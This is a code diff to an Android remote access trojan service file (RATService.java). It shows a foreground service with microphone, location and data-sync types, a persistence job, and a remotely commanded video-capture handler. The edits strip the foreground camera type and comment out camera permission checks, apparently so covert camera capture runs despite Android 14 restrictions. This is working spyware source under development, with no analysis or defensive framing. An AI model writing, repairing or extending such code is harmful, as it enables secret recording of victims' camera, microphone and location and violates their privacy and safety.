@@ -245,29 +245,23 @@ private void startForegroundWithTypes() {
     Notification notification = createNotification();
     
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-        // Combine all service types this service might need
+        // Combine service types WITHOUT camera
         int foregroundServiceTypes = 0;
         
-        foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+        // Remove FOREGROUND_SERVICE_TYPE_CAMERA
         foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
         foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
         foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
         
-        // For Android 14+ (API 34+)
-        if (Build.VERSION.SDK_INT >= 34) {
-            foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
-        }
-        
         try {
             startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes);
-            Log.d(TAG, "Started foreground service with types: " + foregroundServiceTypes);
+            Log.d(TAG, "Started foreground service without camera type");
         } catch (Exception e) {
             Log.e(TAG, "Error starting foreground with types, falling back", e);
             startForeground(NOTIFICATION_ID, notification);
         }
     } else {
         startForeground(NOTIFICATION_ID, notification);
-        Log.d(TAG, "Started foreground service (legacy)");
     }
 }
     
@@ -404,29 +398,23 @@ private void bringAppToForeground() {
     // Add this method to RATService.java
    private String checkCameraPermissions() {
     StringBuilder result = new StringBuilder();
+    
     try {
         boolean hasCamera = ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                 == PackageManager.PERMISSION_GRANTED;
-        result.append("CAMERA: ").append(hasCamera).append(", ");
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            int fgCamCheck = ActivityCompat.checkSelfPermission(this,
-                    Manifest.permission.FOREGROUND_SERVICE_CAMERA);
-            boolean hasFgCamera = fgCamCheck == PackageManager.PERMISSION_GRANTED;
-            result.append("FOREGROUND_CAMERA: ").append(hasFgCamera)
-                  .append(" (check result: ").append(fgCamCheck).append(") ");
-
-            // Extra debug
-            Log.w(TAG, "FOREGROUND_SERVICE_CAMERA checkSelfPermission result = " + fgCamCheck);
-            if (fgCamCheck == PackageManager.PERMISSION_DENIED) {
-                Log.w(TAG, "→ DENIED even after grant - possible Android 14 restriction");
-            }
-        } else {
-            result.append("FOREGROUND_CAMERA: not_required");
-        }
+        result.append("CAMERA: ").append(hasCamera);
+        
+        // REMOVE foreground camera check
+        // if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+        //     boolean hasForegroundCamera = ActivityCompat.checkSelfPermission(this, 
+        //             Manifest.permission.FOREGROUND_SERVICE_CAMERA)
+        //             == PackageManager.PERMISSION_GRANTED;
+        //     result.append(", FOREGROUND_CAMERA: ").append(hasForegroundCamera);
+        // }
     } catch (Exception e) {
         result.append("ERROR: ").append(e.getMessage());
     }
+    
     return result.toString();
 }
     
@@ -435,13 +423,13 @@ private void bringAppToForeground() {
                 == PackageManager.PERMISSION_GRANTED;
     }
     
-    private boolean checkForegroundCameraPermission() {
+   /* private boolean checkForegroundCameraPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             return ActivityCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE_CAMERA)
                     == PackageManager.PERMISSION_GRANTED;
         }
         return true; // Not required on older versions
-    }
+    }*/
     
     private void schedulePersistenceJob() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
@@ -863,10 +851,10 @@ private void bringAppToForeground() {
                         break;
                     }
                     
-                    if (!checkForegroundCameraPermission()) {
+                    /*if (!checkForegroundCameraPermission()) {
                         sendCommand("VIDEO_ERROR|ERROR: Foreground service camera permission not granted. Please reinstall the app and grant all permissions.");
                         break;
-                    }
+                    }*/
                     
                     // Parse args: width|height|fps|bitrate|camera
                     String[] parts = args.split("\\|");
